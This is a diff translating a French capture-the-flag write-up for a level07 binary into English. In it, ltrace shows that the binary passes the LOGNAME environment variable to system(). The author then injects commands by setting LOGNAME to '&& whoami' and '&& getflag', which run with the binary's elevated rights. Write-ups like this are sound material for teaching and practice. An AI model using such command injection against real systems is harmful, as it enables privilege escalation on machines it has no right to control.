@@ -1,8 +1,8 @@
-On trouve dans le dossier **home** un binaire ./level07, qui, si on le lance nous affiche un message :
+In the folder **home** we find a binary ./level07, which, if we launch it, displays a message :
 <pre><code>> ./level07
 level07</code></pre>
 
-On cherche à savoir ce que le binaire fait, pour cela on utilise **ltrace** :
+We want to know what the binary does, so we use **ltrace** :
 <pre><code>> ltrace ./level07
 __libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620
 getegid()= 2007
@@ -17,23 +17,23 @@ system("/bin/echo level07 "level07
 +++ exited (status 0) +++
 </code></pre>
 
-On observe que le binaire fait un **getenv** et appelle **system** pour faire un **echo**
+We observe that the binary makes a **getenv** and calls **system** to make a **echo**
 
-On fait un <code>env</code> pour voir la varibale **LOGNAME** :
+We make a <code>env</code> to see the varibal **LOGNAME** :
 <pre><code>> env
 ...
 LOGNAME=level07
 ...
 </code></pre>
 
-On tente de faire une injection avec un <code>whoami</code> pour verifier que l'injection fonctionne, mais aussi pour connaître les droits avec lesquels le binaire est lancé
+We try to make an injection with a <code>whoami</code> to check that the injection works, but also to know the rights with which the binary is launched
 
 <pre><code>> LOGNAME="&& whoami"
 > ./level07
 flag07
 </code></pre>
 
->On observe **flag07**, ce qui veut dire que nous pouvons faire un **getflag**
+> We observe **flag07**, which means that we can make a **getflag**
 
 <pre><code>> LOGNAME="&& getflag"
 > ./level07
